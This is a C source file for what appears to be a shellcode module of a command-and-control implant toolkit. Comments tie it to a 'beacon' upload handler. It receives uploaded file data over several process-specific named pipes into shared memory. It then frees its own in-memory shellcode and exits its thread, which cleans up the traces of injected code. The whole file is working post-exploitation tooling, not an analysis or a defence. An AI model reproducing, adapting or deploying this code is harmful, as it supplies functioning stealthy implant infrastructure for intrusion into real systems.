#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#include "globalshareddata.h"

/*==============================================================================
 * Helpers
 *============================================================================*/

#ifndef NtCurrentProcessId
#define NtCurrentProcessId() (((PHANDLE)NtCurrentTeb())[8])
#endif

#ifdef _MSC_VER
#define bswap16(x) _byteswap_ushort(x)
#define bswap32(x) _byteswap_ulong(x)
#else
#define bswap16(x) __builtin_bswap16((x))
#define bswap32(x) __builtin_bswap32((x))
#endif

/*==============================================================================
 * Log
 *============================================================================*/

static void DbgPrint(const char* fmt, ...) {
  char buffer[1000] = {};
  va_list args;
  va_start(args, fmt);
  vsprintf_s(buffer, sizeof(buffer), fmt, args);
  va_end(args);
  OutputDebugStringA(buffer);
}

#ifdef _DEBUG
#define _TRACE
#endif

#ifdef _TRACE
#define TRACEF(a, ...) DbgPrint("[DBG] " a "\n", ##__VA_ARGS__)
#else
#define TRACEF(a, ...)
#endif

/*==============================================================================
 * Named Pipe Server
 *============================================================================*/

/*
The beacon COMMAND_UPLOAD handler use fopen and fwrite to upload the file. The
fopen function calls CreateFileW finally and immediately returns whether the
named pipe server is ready or not. And the beacon doesn't wait for the named
pipe server is ready. So, the named pipe server should be ready before the
beacon calls fopen. One solution is to create multiple named pipe servers to
receive the data.

The behavior of named pipes is quite strange. After calling CreateNamedPipe,
there is no need to call ConnectNamedPipe for the client to open the named pipe
directly. However, if DisconnectNamedPipe is called on the same named pipe and
ConnectNamedPipe is not called afterwards, the client will no longer be able to
open the named pipe. If the buffer size is larger than the data written by the
client, the client may return and close the named pipe. When calling
ConnectNamedPipe(hPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED),
it will return that the pipe is not connected.
*/

static BOOL ReadBytes(HANDLE hPipe, PVOID buffer, DWORD size,
                      PDWORD bytesRead) {
  if (bytesRead) *bytesRead = 0;
  while (size) {
    DWORD n;
    if (!ReadFile(hPipe, buffer, size, &n, NULL)) {
      if (GetLastError() != ERROR_BROKEN_PIPE) {
        TRACEF("ReadFile failed: %d", GetLastError());
      }
      return FALSE;
    }
    buffer = (PBYTE)buffer + n;
    size -= n;
    if (bytesRead) *bytesRead += n;
  }
  return TRUE;
}

void MainImpl() {
  // Get the global shared data
  GlobalSharedData* data = GetGlobalSharedData();
  if (data->File) {
    TRACEF("File already set\n");
    return;
  }

  // Get the pipe name
  char pipeName[100] = {};
  sprintf(pipeName, "\\\\.\\pipe\\%d4155",
          (UINT32)(SIZE_T)NtCurrentProcessId());
  TRACEF("Pipe name: %s", pipeName);

  // Create the initial pipe to receive the header
  HANDLE hInitialPipe = CreateNamedPipeA(
      pipeName, PIPE_ACCESS_INBOUND, PIPE_READMODE_BYTE | PIPE_WAIT,
      PIPE_UNLIMITED_INSTANCES, 0, 1024, 0, NULL);
  ConnectNamedPipe(hInitialPipe, NULL);

  // Read and validate the header
  struct {
    DWORD Magic;
    DWORD Size;
  } header = {};
  ReadBytes(hInitialPipe, &header, sizeof(header), NULL);
  if (header.Magic != 0x11223344) {
    TRACEF("Invalid magic: 0x%08X", header.Magic);
    CloseHandle(hInitialPipe);
    return;
  }
  header.Size = bswap32(header.Size);
  TRACEF("Data size: %d", header.Size);

  // Set the file server
  FileServer* file = (FileServer*)malloc(sizeof(FileServer));
  file->Data = NULL;
  file->Size = 0;
  file->CompletionEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
  data->File = file;
  TRACEF("File server set: %p\n", &data->File);

  // Create the named pipe servers to receive all chunks
  SIZE_T blockCount = header.Size / (254 * 1024);
  HANDLE* hPipes = (HANDLE*)malloc(sizeof(HANDLE) * blockCount);
  for (SIZE_T i = 0; i < blockCount; i++) {
    hPipes[i] =
        i != 0 ? CreateNamedPipeA(pipeName, PIPE_ACCESS_INBOUND,
                                  PIPE_READMODE_BYTE | PIPE_WAIT,
                                  PIPE_UNLIMITED_INSTANCES, 0, 1024, 0, NULL)
               : hInitialPipe;
    if (!hPipes[i] || hPipes[i] == INVALID_HANDLE_VALUE) {
      TRACEF("Failed to create named pipe %d: %d", (UINT32)i, GetLastError());
    }
  }

  // Read all chunks
  PVOID buffer = malloc(header.Size);
  DWORD offset = 0;
  do {
    for (SIZE_T i = 0; i < blockCount; i++) {
      // Skip the closed named pipe
      if (!hPipes[i]) {
        continue;
      }

      // Ensure the named pipe is really connected
      if (!PeekNamedPipe(hPipes[i], NULL, 0, NULL, NULL, NULL)) {
        continue;
      }
      TRACEF("[%d] Connected", (UINT32)i);

      // Read the chunk
      DWORD bytesRead = 0;
      ReadBytes(hPipes[i], (PBYTE)buffer + offset, header.Size - offset,
                &bytesRead);
      offset += bytesRead;
      TRACEF("[%d] Read %d bytes (left: %d)", (UINT32)i, bytesRead,
             header.Size - offset);

      // Close the named pipe
      CloseHandle(hPipes[i]);
      hPipes[i] = NULL;
    }

    // Sleep for a while to reduce CPU usage
    Sleep(10);
  } while (offset != header.Size);

  // Close unused named pipes
  for (SIZE_T i = 0; i < blockCount; i++) {
    if (hPipes[i] && hPipes[i] != INVALID_HANDLE_VALUE) {
      CloseHandle(hPipes[i]);
    }
  }

  // Set the file data and trigger the completion event
  file->Data = buffer;
  file->Size = header.Size;
  SetEvent(file->CompletionEvent);
}

#include "selfunload.h"

EXTERN_C VOID Main() {
  MainImpl();

  // Self-unload
  PVOID code = (PVOID)Main;
  MEMORY_BASIC_INFORMATION mbi;
  if (!VirtualQuery(code, &mbi, sizeof(mbi)) ||
      mbi.BaseAddress != mbi.AllocationBase) {
    TRACEF("Can't free the file server shellcode memory.");
    return;
  }
  TRACEF("Free the file server shellcode memory: %p (code: %p)",
         mbi.BaseAddress, code);
  VirtualFreeAndExitThread(mbi.BaseAddress, (void*)VirtualFree,
                           (void*)ExitThread);
}
